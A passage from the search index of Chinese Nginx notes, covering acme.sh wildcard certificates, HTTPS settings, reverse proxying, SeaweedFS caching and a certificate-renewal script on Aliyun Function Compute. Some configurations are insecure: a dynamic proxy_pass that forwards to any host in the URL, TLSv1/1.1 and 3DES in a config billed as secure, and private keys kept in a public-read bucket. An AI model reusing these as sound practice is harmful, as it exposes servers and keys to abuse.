\u3002","title":"\u7b2c\u4e8c\u6b65\uff0c\u8fd0\u884c\u6211\u7684getcert.py\uff08\u521b\u5efa\u79c1\u94a5\u5e76\u63d0\u4ea4\u7533\u8bf7\uff09\uff1a"},{"location":"Nginx/#acmesh","text":"\u6cdb\u57df\u540d\u89e3\u6790\u9700\u8981\u4f7f\u7528DNS\u9a8c\u8bc1\uff0c\u5c31\u9700\u8981\u4f7f\u7528DNS\u670d\u52a1\u7684API\uff0c\u5373\u4f7f\u6ca1\u6709API\u53ea\u8981\u914d\u7f6e\u4e00\u6761CNAME\u6307\u5411\u4e00\u4e2a\u6709DNS API\u7684\u57df\u540d\u5373\u53ef \u9996\u5148\u83b7\u5f97acme.sh git clone https://github.com/Neilpang/acme.sh \u7136\u540e\u62ff\u5230cloudflare\u7684API Key\uff0c\u6258\u7ba1b.com \u9700\u8981\u62ff\u5230\u80fd\u7528\u4e8ea.com\u548c*.a.com\u7684\u8bc1\u4e66\uff0c\u5148\u914d\u7f6eCNAME\uff08\u53c2\u8003\uff1ahttps://github.com/Neilpang/acme.sh/wiki/DNS-alias-mode\uff09 _acme-challenge.a.com => _acme-challenge.b.com \u6267\u884c\u547d\u4ee4\u54af\uff1a CF_Key=xxx CF_Email=xxx@example.com /root/acme.sh/acme.sh --issue --dns dns_cf -d '*.a.com' --challenge-alias b.com -d a.com --dnssleep 10 --fullchain-file /root/acom.crt --key-file /root/acom.key -f \u89e3\u91ca\uff1a\u524d\u9762\u4e24\u4e2a\u662f\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528cloudflare\u6240\u4ee5\u6307\u5b9a\u2013dns dns_cf\uff0c\u7136\u540e-d \u2026 \u2013challenge-alias \u2026 -d \u2026 \u6307\u5b9a\u57df\u540d\u548c\u9a8c\u8bc1\u7528\u7684\u57df\u540d\uff0c\u2013dnssleep 10\u7b49\u5f8510\u79d2DNS\u751f\u6548\uff08\u9ed8\u8ba4120\u79d2\u6ca1\u5fc5\u8981\uff09\uff0c\u2013fullchain-file\u548c\u2013key-file \u6307\u5b9a\u751f\u6210\u540e\u628a\u8bc1\u4e66\u6587\u4ef6\u548c\u5bc6\u94a5\u6587\u4ef6\u62f7\u8d1d\u5230\u54ea","title":"\u4f7f\u7528acme.sh\u83b7\u5f97\u6cdb\u57df\u540d\u8bc1\u4e66"},{"location":"Nginx/#https","text":"\u6b64\u5904\u53c2\u8003 https://z.codes/ssl-lab-a-plus-configuration-for-nginx/ \u9996\u5148\u4ecePPA\u5b89\u88c5nginx, \u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u6700\u65b0\u7248 add-apt-repository ppa:nginx/stable apt update apt install nginx \u521b\u5efaDH\u968f\u673a\u8d28\u6570\uff1a openssl dhparam -out /etc/ssl/dhparams.pem 2048 \u521b\u5efa/etc/nginx/https.conf\uff1a listen 443 ssl http2 ; add_header Strict - Transport - Security \"max-age=31536000\" always ; add_header Upgrade - Insecure - Requests \"1\" ; add_header Content - Security - Policy \"upgrade-insecure-requests\" ; ssl_dhparam / etc / ssl / dhparams . pem ; ssl_stapling on ; ssl_stapling_verify on ; resolver 8.8.8.8 8.8.4.4 114.114.114.114 valid = 60 s ; resolver_timeout 2 s ; ssl_protocols TLSv1 TLSv1 .1 TLSv1 .2 ; ssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA' ; ssl_session_cache shared : SSL : 10 m ; ssl_session_timeout 24 h ; ssl_buffer_size 1400 ; ssl_prefer_server_ciphers on ; keepalive_timeout 600 s ; location ~* / \\ .( ? ! well - known \\ / ) { deny all ; } location ~* ( ? :\\ .( ? : bak | conf | dist | fla | in [ ci ]| log | psd | sh | sql | sw [ op ] ) |~ ) $ { deny all ; } include mime . types ; \u4e3a\u9700\u8981\u542f\u7528https\u7684\u7ad9\u70b9\uff0c\u5728/etc/nginx/sites-enabled/\u4e2d\u5199\u5165conf\u6587\u4ef6 server { listen 443; server_name \u57df\u540d1 \u57df\u540d2; access_log /tmp/access.log; error_log /tmp/error.log; ssl_certificate \u5bc6\u94a5\u76ee\u5f55/\u540d\u79f0.crt; ssl_certificate_key \u5bc6\u94a5\u76ee\u5f55/\u540d\u79f0.key; include https.conf \u5176\u4ed6\u914d\u7f6e\u3002\u3002\u3002 }","title":"\u914d\u7f6e\u5b89\u5168\u7684https"},{"location":"Nginx/#js","text":"\u4f7f\u7528\u6a21\u5757ngx_http_substitutions_filter_module\uff0c\u89c1Github: https://github.com/yaoweibin/ngx_http_substitutions_filter_module \u9700\u8981\u91cd\u65b0\u7f16\u8bd1nginx\uff0cTip: nginx -V \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u5f53\u524d\u7248\u672c\u7684nginx\u7684\u7f16\u8bd1\u53c2\u6570 \u7f16\u8bd1\u540e\u5c31\u53ef\u4ee5\u7528\u5566\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u5fae\u4fe1\u7684\u516c\u4f17\u53f7\u6587\u7ae0\u9875\u9762\u4e3a\u4e86\u8282\u7701\u7528\u6237\u6d41\u91cf\uff0c\u56fe\u7247\u662f\u628a\u9875\u9762\u6eda\u52a8\u81f3\u6240\u5728\u4f4d\u7f6e\u624d\u52a0\u8f7d\u7684\uff0c\u4ee3\u7801\u4e0a\u7684\u5dee\u5f02\u5c31\u662fimg\u6807\u7b7e\u672c\u5e94\u662fsrc\u7684\u6539\u6210\u4e86data-src\uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u505a\u4e00\u4e2a\u5fae\u4fe1\u7684\u53cd\u5411\u4ee3\u7406\u7f51\u7ad9\uff0c\u628adata-src\u66ff\u6362\u6210src\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u6240\u6709\u56fe\u7247\uff08\u5514\u3002\u3002\u3002\u5176\u5b9e\u8fd8\u4e0d\u591f\uff0c\u8fd8\u9700\u8981\u8003\u8651\u9632\u76d7\u94fe\u7684\u95ee\u9898\uff09\uff1b\u5e76\u4e14\u8bbe\u7f6eMIME\u7c7b\u578b\u5305\u542bJavascript subs_filter \u9700\u8981\u66ff\u6362\u6389\u7684\u5185\u5bb9 \u66ff\u6362\u540e\u7684\u6587\u672c; subs_filter data-src src; subs_filter_types application/x-javascript text/javascript appliation/x-javascript;","title":"\u53cd\u5411\u4ee3\u7406\u4e4b\u66ff\u6362\u7f51\u9875\u3001JS\u4e2d\u7684\u6587\u672c"},{"location":"Nginx/#git","text":"\u5728server\u5757\u4e2d\u6dfb\u52a0\uff1a location ~ /\\. { return 404; } \u76f8\u5e94\u7684Apache\u53ef\u4ee5\u5728httpd.conf\u4e2d\u6dfb\u52a0\uff1a RedirectMatch 404 /\\.git","title":"\u7981\u6b62git\u76ee\u5f55\u8bbf\u95ee"},{"location":"Nginx/#rootalias","text":"From: http://stackoverflow.com/questions/10631933/nginx-static-file-serving-confusion-with-root-alias \u4e00\u53e5\u8bdd\u6982\u62ec\uff0croot\u5bf9\u5e94\u7684\u76ee\u5f55\u4f1a\u52a0\u4e0alocation\u90e8\u5206\u53bb\u627e\u6587\u4ef6\uff0c\u800calias\u5219\u4e0d\u4f1a location / static / { root / var / www / app / static / ; autoindex off ; } \u5982\u679c\u6211\u4eec\u8fd9\u4e48\u5199\uff0c\u90a3\u4e48\u8bbf\u95eestatic\u76ee\u5f55\u4e0b\u7684a.jpg\u5c31\u4f1a\u53bb\u627e/var/www/app/static/static\u76ee\u5f55\u4e0b\u7684a.jpg\uff0c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2astatic/static\u5c31\u4f1a404 \u89e3\u51b3\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a \u5982\u679clocation\u4e2d\u7684static\u5c31\u662f\u771f\u5b9e\u76ee\u5f55\uff0croot\u4e2d\u5c31\u4e0d\u8981\u5199static\u4e86 location / static / { root / var / www / app / ; autoindex off ; } \u6216\u8005\u7528alias\u5c31\u4e0d\u4f1a\u518d\u52a0\u4e0alocation\u7684\u90e8\u5206\uff1a location / static / { alias / var / www / app / static / ; autoindex off ; }","title":"root\u4e0ealias\u7684\u533a\u522b"},{"location":"Nginx/#bash-on-win10nginx","text":"\u4e0eLinux\u4e2d\u5b89\u88c5\u7c7b\u4f3c\uff0c\u53ea\u8981 apt-get install nginx \u5373\u53ef\uff0c\u4f46\u53ef\u80fd\u4f1a\u53d1\u73b0nginx\u5e76\u4e0d\u6b63\u5e38\u5de5\u4f5c\uff0c\u65e5\u5fd7\u4e2d\u662f\u8fd9\u6837\u7684\uff1a [ alert ] 79 #0 : ioctl ( FIOASYNC ) failed while spawning \"worker process\" ( 22 : Invalid argument ) \u89e3\u51b3\u65b9\u6848\uff1a\u5728/etc/nginx/nginx.conf\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a master_process off;","title":"\u5728bash on win10\u4e0a\u4f7f\u7528Nginx"},{"location":"Nginx/#ip","text":"proxy_set_header realip $remote_addr; \u8fd9\u6837\u8bbe\u7f6e\u540e\uff0cNginx\u53cd\u5411\u4ee3\u7406\u4e0a\u4e00\u7ea7\u670d\u52a1\u4f1a\u52a0\u4e0arealip\u8fd9\u4e2a\u5934\uff0c\u4ece\u800c\u4f20\u9012\u7528\u6237\u771f\u5b9e\u7684IP\uff08\u5982\u679c\u662f\u4ee3\u7406\u5219\u662f\u4ee3\u7406\u7684IP\uff09","title":"\u4f7f\u4e0a\u4e00\u7ea7\u670d\u52a1\u77e5\u9053\u7528\u6237IP"},{"location":"Nginx/#nginx_2","text":"\u52a0\u4e0a autoindex on \u5373\u53ef\uff0c\u540e\u4e24\u9879\u662f\u4e3a\u4e86 \u663e\u793a\u670d\u52a1\u5668\u65f6\u95f4\u800c\u4e0d\u662fGMT\u65f6\u95f4 \u4ee5\u53ca \u4ee5kB,MB,GB\u4e3a\u5355\u4f4d\u663e\u793a\u5927\u5c0f\u800c\u4e0d\u662f\u786e\u5207\u7684\u5b57\u8282\u6570 location / { autoindex on; autoindex_localtime on; autoindex_exact_size off; }","title":"Nginx\u5141\u8bb8\u5217\u76ee\u5f55"},{"location":"Nginx/#seaweedfs","text":"\u60f3\u57fa\u4e8eseaweedfs\u5b9e\u73b0\u4e00\u4e2a\u53cd\u5411\u4ee3\u7406\u7684\u7f13\u5b58\u670d\u52a1\u5668\uff0cNginx\u5148\u8bf7\u6c42A\u670d\u52a1\u5668(weedfs filer)\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u5b58\u4e0b\u8fd9\u5f20\u56fe\u7247(\u8fd4\u56de404)\uff0c\u5207\u81f3B\u670d\u52a1\u5668(Python flask)\u53bb\u722c\u53d6\u56fe\u7247\u5e76\u4f20\u81f3weedfs\u5b58\u50a8 seaweedfs\u7684filer\u63d0\u4f9b\u4e86\u6309\u81ea\u5df1\u6307\u5b9a\u7684\u8def\u5f84\u4e0a\u4f20\u4e0b\u8f7d\u529f\u80fd\uff08\u5bf9\u8c61\u5b58\u50a8\uff09\uff0c\u5c31\u4e0d\u9700\u8981\u518d\u81ea\u5df1\u8003\u8651\u600e\u4e48\u5b58\u50a8path\u4e0efid\u7684\u5bf9\u5e94\u5173\u7cfb\u4e86\uff0c\u76f4\u63a5\u6309\u722c\u53d6\u6e90\u7684\u8def\u5f84\u5b58\u50a8\u5373\u53ef \u5b9e\u73b0\uff1a","title":"\u5b89\u5168\u5730\u4f7f\u7528SeaweedFS\u4f5c\u4e3a\u56fe\u7247\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668"},{"location":"Nginx/#nginx_3","text":"","title":"Nginx\u914d\u7f6e"},{"location":"Nginx/#httpupstream","text":"\u6ce8\u610f\u628aB\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3abackup \u4e0d\u8981\u53c2\u4e0e\u9ed8\u8ba4\u8d1f\u8f7d\u5747\u8861 upstream up { server weedfs:8888; server 127.0.0.1:80 backup; }","title":"\u5728http\u6bb5\u4e2d\u6dfb\u52a0upstream"},{"location":"Nginx/#server","text":"\u6211\u5e0c\u671b\u8bbf\u95ee /images/hhh.jpg \u5b9e\u9645\u8bbf\u95ee http://weedfs:8888/my_images/hhh.jpg \u5173\u952e\u5c31\u662f proxy_next_upstream location /images/ { rewrite ^/images(/.*)$ /my_images$1 break; proxy_pass http://up; proxy_next_upstream http_404; proxy_hide_header Content-Type; add_header Content-Type image/jpeg; limit_except GET { deny all; } } \u5728seaweedfs\u8fd4\u56de404\u7684\u65f6\u5019\u4f1a\u7ee7\u7eed\u8bf7\u6c42 http://127.0.0.1/my_images/hhh.jpg \u8fd9\u79cdrewrite\u662f\u4e0d\u4f1a\u4fee\u6539POST\u7684url\u7684\u3002\u3002\u3002\u5c31\u5f88\u8ff7\uff0c\u53e6\u5916\u5141\u8bb8\u7528\u6237POST\u4e0a\u4f20\u4e5f\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u7981\u6b62\u4e86\u975eGET\u65b9\u6cd5","title":"server\u6bb5\u914d\u7f6e"},{"location":"Nginx/#header","text":"\u8fd9\u91cc\u7528\u7684\u662f\u5148\u5220\u9664 proxy_hide_header \u518d\u6dfb\u52a0 add_header","title":"\u4fee\u6539\u540e\u7aef\u7279\u5b9aheader"},{"location":"Nginx/#nginxseaweedfs","text":"\u4e0d\u8981\u6b7b\u78d5\u4e00\u4e2alocation\u561b\uff0c\u518d\u914d\u7f6e\u4e2a\u5457\uff1a location / upload_images / { rewrite ^/ upload_images ( /.* ) $ $ 1 break ; resolver 127.0 . 0.11 valid = 10 s ; proxy_pass http : // weedfs : 8888 / my_images $ 1 ; allow 127.0 . 0.0 / 8 ; deny all ; } \u8fd9\u6837\u914d\u7f6e\u7684\u6548\u679c\u662fPOST /upload_images/ \u76f8\u5f53\u4e8e\u5728POST http://weedfs:8888/my_images/ \u4e0e\u524d\u8ff0\u7684GET\u914d\u7f6e\u662f\u76f8\u540c\u7684\u540e\u7aef\u8def\u5f84\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\uff08\u5982 /123.jpg \uff09\u5c31\u4f20\u5230\u4e86weedfs\u7684 http://weedfs:8888/my_images/123.jpg \u80fd\u901a\u8fc7 /images/123.jpg \u8bbf\u95ee\u5230","title":"\u6211\u8fd8\u662f\u60f3\u8ba9nginx\u4e5f\u80fd\u652f\u6301\u7ed9seaweedfs\u4e0a\u4f20\u6587\u4ef6"},{"location":"Nginx/#proxy_passdns","text":"\u7531\u4e8e\u8fd9\u4e2anginx\u662f\u5728Docker\u5bb9\u5668\u91cc\u9762\u7684\uff0cweedfs\u662f\u53e6\u4e00\u4e2a\u5bb9\u5668\u52a0\u5165\u7f51\u7edc\u7684\u65f6\u5019\u6307\u5b9a\u7684\u522b\u540d\uff0c\u6240\u4ee5\u6ce8\u610f\u4e0a\u9762\u7684resolver\u8bbe\u7f6e\u4e3a\u4e0e\u5bb9\u5668/etc/resolv.conf\u4e00\u81f4\u7684 127.0.0.11 \u7ecf\u8fc7\u6211\u6d4b\u8bd5\uff0c\u8fd9\u4e2a\u914d\u7f6e\u5fc5\u987b\u5728location\u4e2d\u624d\u6709\u6548\uff0c\u653e\u5230http\u91cc\u9762\u6ca1\u7528","title":"\u914d\u7f6eproxy_pass\u4f7f\u7528\u7684DNS\u670d\u52a1\u5668"},{"location":"Nginx/#docker-seaweedfs","text":"","title":"Docker \u6211\u4f7f\u7528\u7684seaweedfs\u542f\u52a8\u547d\u4ee4"},{"location":"Nginx/#filer","text":"\u9996\u5148\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u4e00\u4e2aDocker\u955c\u50cf\uff0c\u9ed8\u8ba4\u7684\u955c\u50cf\u4f1a\u628afiler\u7684leveldb\u6570\u636e\u5b58\u50a8\u5728\u6839\u76ee\u5f55\uff0c\u5220\u9664\u5bb9\u5668\u5c31\u4f1a\u4e22\u5931\u8fd9\u90e8\u5206\u6570\u636e \u53c2\u89c1\uff1ahttps://github.com/chrislusf/seaweedfs/blob/master/docker/ filer.toml : [leveldb] enabled = true dir = \"/data/filer/\" Dockerfile : FROM chrislusf/seaweedfs COPY filer.toml /etc/seaweedfs/filer.toml","title":"\u7f16\u8bd1\u955c\u50cf \u907f\u514d\u4e22\u5931filer\u6570\u636e"},{"location":"Nginx/#_3","text":"docker run - dit --name weedfs --restart=always --user nobody -v /data/weedfs:/data myweed -log_dir=/data/logs/ server -dir /data -filer=true -filer.disableDirListing -volume.publicUrl=weedfs.py3.io docker network connect useweed weedfs --alias weedfs \u5efa\u8bae\u5728\u6d4b\u8bd5\u7684\u65f6\u5019\u4e0d\u8981\u7528 -filer.disableDirListing \u9009\u9879\uff0c\u53ef\u4ee5\u5217\u76ee\u5f55\u6765\u770b\u770b\u5230\u5e95\u4e0a\u4f20\u5230\u54ea\u4e86\uff1a curl -H \"Accept: application/json\" \"http://weedfs:8888/my_images/?pretty=y\" \u53e6\u5916\u6ce8\u610f\u542f\u52a8\u524d\u521b\u5efa\u6587\u4ef6\u5939\u548c\u914d\u7f6e\u6743\u9650\uff1a\uff08\u4e0d\u8981\u4ee5\u4e3a\u4eba\u5bb6\u4f1a\u7ed9\u4f60\u521b\u5efa\u76ee\u5f55\uff09 mkdir -p /data/weedfs/logs/ mkdir -p /data/weedfs/filer/ sudo chown -R nobody /data/weedfs","title":"\u542f\u52a8\u547d\u4ee4"},{"location":"Nginx/#b","text":"TARGET_SERVER = \"http://images.example.com/\" WEEDFS_FILER_ENDPOINT = \"http://nginx/upload_images/\" from flask import Flask , Response import requests import io sess = requests . session () app = Flask ( __name__ ) @app.route ( \"/my_images/<name>\" ) def handler ( name ): x = sess . get ( TARGET_SERVER + name ) sess . post ( WEEDFS_FILER_ENDPOINT , files = [( 'filename' , ( name , io . BytesIO ( x . content )))]) return Response ( x . content , mimetype = \"image/jpeg\" )","title":"B\u670d\u52a1\u5668\u7684\u5b9e\u73b0"},{"location":"Nginx/#pythonpyseaweed","text":"pip install pyseaweed \u5982\u679c\u670d\u52a1\u5668\u542f\u52a8\u7684\u65f6\u5019\u914d\u7f6e\u7684 publicUrl \u4ee5 https:// \u5f00\u5934\uff0c\u8fd9\u4e2a pyseaweed \u5e93\u662f\u6709\u95ee\u9898\u7684\uff0c\u9700\u8981\u624b\u52a8\u4fee\u51e0\u5904url\u6784\u9020\u7684\u5730\u65b9 publicurl = \"http://localhost:8080/\" from pyseaweed import WeedFS w = WeedFS ( \"localhost\" , 9333 , use_session = True ) # \u4e0a\u4f20 \u4e5f\u652f\u6301\u4f20\u5165\u6d41 fid = w . upload_file ( filename ) # \u4e0b\u8f7d \u5f97\u5230\u5bf9\u8c61\u5b57\u8282 data = w . conn . _conn . get ( publicurl + fid ) . content","title":"\u987a\u4fbf\u9644\u4e0aPython\u5e93pyseaweed\u7684\u4f7f\u7528"},{"location":"Nginx/#proxy_pass","text":"\u6548\u679c\uff1a\u8bbf\u95ee /www.example.com/ \u53cd\u5411\u4ee3\u7406\u5230 http://www.example.com \uff0c\u5e76\u652f\u6301\u4e00\u6b21\u8df3\u8f6c location ~ ^/ (. * ) $ { proxy_pass http : // $ 1 ; proxy_intercept_errors on ; error_page 301 302 307 = @handle_redirect ; } location @handle_redirect { set $ saved_redirect_location '$upstream_http_location' ; proxy_pass $ saved_redirect_location ; }","title":"proxy_pass \u52a8\u6001\u4ee3\u7406"},{"location":"Nginx/#nginxserver","text":"\u53c2\u8003\uff1a https://serverfault.com/questions/214242/can-i-hide-all-server-os-info apt install -y nginx-extras \u914d\u7f6e\u4e2d\u6dfb\u52a0\uff1a header_filter_by_lua 'ngx.header[\"server\"] = nil';","title":"Nginx\u9690\u85cfServer\u5934 \u7b80\u5355\u65b9\u5f0f"},{"location":"Nginx/#https_1","text":"\u4e3a\u4e86\u51cf\u5c11\u5bf9vps\u7684\u4f9d\u8d56\uff0c\u9010\u6b65\u5c06\u4e00\u4e9b\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\u7684\u4efb\u52a1\u8fc1\u79fb\u5230\u66f4\u52a0\u53ef\u9760\u7684\u51fd\u6570\u8ba1\u7b97 \u8fd9\u4e0d\u662f\u4e00\u4e2a\u8be6\u7ec6\u7684\u6559\u7a0b\uff0c\u4f60\u8fd8\u9700\u8981\u81ea\u884c\u63a2\u7d22\u7814\u7a76","title":"\u4f7f\u7528\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u5b9a\u65f6\u66f4\u65b0https\u8bc1\u4e66"},{"location":"Nginx/#_4","text":"https://fc.console.aliyun.com \u5173\u952e\u8bcd\uff1a \u6559\u7a0b \u5b9a\u4ef7 128MB\u662f\u514d\u8d39\u7684 \u5b9a\u65f6\u89e6\u53d1\u5668 \u65e5\u5fd7\u670d\u52a1","title":"\u5165\u53e3"},{"location":"Nginx/#_5","text":"Python3 \u5148\u672c\u5730 git clone --depth 1 https://github.com/Neilpang/acme.sh \uff0c\u518d\u521b\u5efa\u4e2aindex.py \u628a\u4ee3\u7801\u6587\u4ef6\u5939\u4e0a\u4f20\u4e0a\u53bb \u7f51\u9875\u4e0a\u5728\u7ebf\u7f16\u8f91index.py\u4e0d\u4f1a\u4e22\u5931acme.sh\u6587\u4ef6\u5939\uff08\u53ea\u4f1a\u6539\u52a8index.py\uff09\uff0c\u4ee3\u7801\u6539\u52a8\u540e\u5c31\u80fd\u76f4\u63a5\u8fd0\u884c\u770b\u5230\u7ed3\u679c\uff08\u5b9e\u65f6\u8f93\u51fa\u9700\u8981\u53bb\u65e5\u5fd7\u670d\u52a1\u641c\u7d22\uff09\uff0c\u8fd8\u662f\u633a\u597d\u7528\u7684 \u4f7f\u7528\u8fd9\u4e2a\u4ee3\u7801\u9700\u8981\u5148\u521b\u5efa\u4e00\u4e2a\u53ef\u4ee5\u8bbf\u95eeOSS\u7684AccessKey\uff0c\u586b\u5165 oss2.Auth \u90e8\u5206\u2014\u2014\u5c06\u751f\u6210\u7684https\u8bc1\u4e66\u548c\u79c1\u94a5\u5b58\u50a8\u5230OSS\uff0c\u5c06Key\u786c\u7f16\u7801\u5230\u4ee3\u7801\u4e2d\u4e0d\u662f\u4e00\u4e2a\u597d\u4e60\u60ef\uff0c\u8fd9\u91cc\u5c31\u7b80\u5355\u7c97\u66b4\u5b9e\u73b0\u4e86 \u57df\u540d\u9a8c\u8bc1\u65b9\u5f0f\u7528\u7684\u662fchallenge-alias\u7684dns\u9a8c\u8bc1\uff0c\u9700\u8981\u5c06 _acme-challenge.py3.io \u8bbe\u7f6eCNAME\u5230 _acme-challenge.chenyuan.me \u3002 \u5982\u679c\u4f60\u8fd8\u9700\u8981\u66f4\u591a\u7684\u5b50\u57df\u540d\u5982 *.subdomain.py3.io \uff0c\u90a3\u4e5f\u8981\u628a _acme-challenge.subdomain.py3.io \u8bbe\u7f6eCNAME\u5230 _acme-challenge.chenyuan.me \u7528\u7684\u662fcloudflare\u7684API\uff0c\u9700\u8981\u63d0\u4f9b CF_Key \u548c CF_Email \uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 \u66f4\u591a\u7684API \u5b9a\u65f6\u5668\u8bbe\u7f6e\u5341\u4e94\u5929\u6267\u884c\u4e00\u6b21\uff0ccron\u8868\u8fbe\u5f0f\u4e3a\uff1a 0 0 0 1,15 * * \u4f60\u9700\u8981\u66ff\u6362\u4e0b\u9762\u4ee3\u7801\u7684REGION OSS\u5730\u57df, AK, SK \u53ef\u4ee5\u8bbf\u95eeOSS\u7684\u5bc6\u94a5, OSSNAME \u4f7f\u7528\u7684OSS\u540d\u79f0, CF_Key cloudflare\u7684API Key, CF_Email cloudflare\u7684\u7528\u6237\u540d\u90ae\u7bb1, chenyuan.me \u5728cloudflare\u4e0a\u6258\u7ba1\u7684\u57df\u540d, py3io_ATxx \u7533\u8bf7\u5f97\u5230\u7684\u8bc1\u4e66\u7684\u540d\u79f0 \u52a0\u5165\u968f\u673a\u5b57\u7b26\u4e32\u907f\u514d\u88ab\u731c\u5230, [\"py3.io\", \"*.py3.io\"] \u7533\u8bf7\u7684\u57df\u540d\u5217\u8868 # -*- coding: utf-8 -*- import os import logging import random import os import oss2 import io import time import string import json logger = logging . getLogger () endpoint = 'http://oss-cn-REGION-internal.aliyuncs.com' auth = oss2 . Auth ( 'AK' , 'SK' ) bucket = oss2 . Bucket ( auth , endpoint , 'OSSNAME' ) def getcert ( name , domains ): global logger try : try : lasttime = bucket . get_object_meta ( name + \".crt\" ) . last_modified if time . time () - lasttime <= 86400 * 60 : # do not recreate cert for 60 days logger . info ( 'Skip cert for ' + name ) return except : pass logger . info ( 'Getting cert for ' + name ) domain_text = \"-d '\" + \"' -d '\" . join ( domains ) + \"'\" cmd = \"CF_Key=xxx CF_Email=xxx@yyy.com ./acme.sh/acme.sh --issue --dns dns_cf \" + domain_text + \" --dnssleep 5 --fullchain-file /tmp/\" + name + \".crt --key-file /tmp/\" + name + \".key -f \" if name != \"chenyuan.me\" : cmd += \"--challenge-alias chenyuan.me\" print ( \"acme.sh --issue\" + cmd . split ( \"--issue\" )[ 1 ]) assert os . system ( cmd ) == 0 , \"get cert failed\" bucket . put_object_from_file ( name + \".crt\" , \"/tmp/\" + name + \".crt\" ) bucket . put_object_from_file ( name + \".key\" , \"/tmp/\" + name + \".key\" ) logger . info ( 'Done for ' + name ) except Exception as e : logger . exception ( \"exception happend: \" + name ) def handler ( event , context ): getcert ( \"py3io_ATxx\" , [ \"py3.io\" , \"*.py3.io\" ]) return 'ok'","title":"\u4ee3\u7801\u6846\u67b6"},{"location":"Nginx/#_6","text":"\u53d6\u5f97\u4e00\u4e2a\u57df\u540d\u7684\u8bc1\u4e66\u5927\u7ea6\u9700\u89811~2\u5206\u949f\uff0c\u7531\u4e8e\u51fd\u6570\u8ba1\u7b97\u5141\u8bb8\u7684\u6700\u957f\u8d85\u65f6\u662f600\u79d2\uff0c\u8fd8\u6709\u8003\u8651\u7f51\u7edc\u56e0\u7d20\uff08\u6bd5\u7adfcloudflare\u548clet\u2019s encrypt\u90fd\u5728\u56fd\u5916\uff09\uff0c \u662f\u6709\u53ef\u80fd\u5931\u8d25\u7684 \u6211\u91c7\u53d6\u7684\u7b56\u7565\u5c31\u5f88\u7b80\u5355\u7c97\u66b4 \u6bcf15\u5929\u6267\u884c\u4e00\u904d\uff0c\u4e00\u4e2a\u57df\u540d\u5931\u8d25\u4e86\u4e0d\u5f71\u54cd\u5176\u4ed6\u57df\u540d\u7684\u5c1d\u8bd5\uff0c60\u5929\u5185\u6210\u529f\u4e86\u7684\u57df\u540d\u4e0d\u4f1a\u53cd\u590d\u7533\u8bf7\uff0c\u603b\u4f1a\u6210\u529f\u7684 \u5b89\u5168\u6027\uff1a\u4e3a\u4e86\u4fbf\u4e8e\u5c06\u8bc1\u4e66\u90e8\u7f72\u5230web\u670d\u52a1\u5668\uff0cOSS\u4ed3\u5e93\u662f\u8bbe\u7f6e\u6210\u516c\u5f00\u8bfb\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u80fd\u6cc4\u9732\u79c1\u94a5\u6587\u4ef6\uff08\u653b\u51fb\u8005\u77e5\u9053OSS\u540d\u79f0\uff0c\u731c\u5230\u6587\u4ef6\u540d\u79f0\uff09\uff0c\u4f60\u53ef\u4ee5\u7528Referer\u9650\u5236\u6765\u589e\u52a0\u4e00\u70b9\u5b89\u5168\u6027","title":"\u66f4\u591a\u8bf4\u660e"},{"location":"Nginx/#web","text":"\u4e5f\u662f\u5199\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u54af 0 0 0 3,17 * * \uff0c\u6bcf\u4e2a\u67083\u53f7\u548c17\u53f7\u7528curl\u83b7\u53d6\u4e00\u4e0b\u6700\u65b0\u7684\u8bc1\u4e66 \u5982\u679cnginx\u7684\u914d\u7f6e\u539f\u5148\u5c31\u662f\u9519\u7684\uff0c\u4e0d\u4f1a\u5c1d\u8bd5\u66f4\u65b0\u8bc1\u4e66 \u5982\u679c\u66f4\u65b0\u8bc1\u4e66\u540enginx\u65e0\u6cd5\u542f\u52a8\uff08\u6bd4\u5982\u65e0\u6cd5\u8fde\u4e0a\u963f\u91cc\u4e91\u4e0b\u8f7d\u7684\u6587\u4ef6\u4e3a\u7a7a\u6216404\uff09\uff0c\u4f1a\u56de\u6eda\u8fd9\u4e2a\u6539\u52a8\uff0c\u4fdd\u8bc1nginx\u4ecd\u7136\u53ef\u4ee5\u542f\u52a8 \u4f60\u9700\u8981\u66ff\u6362\u4e0b\u9762\u4ee3\u7801\u7684NAME, OSSNAME, REGION \u540c\u4e0a, Referer_STRING 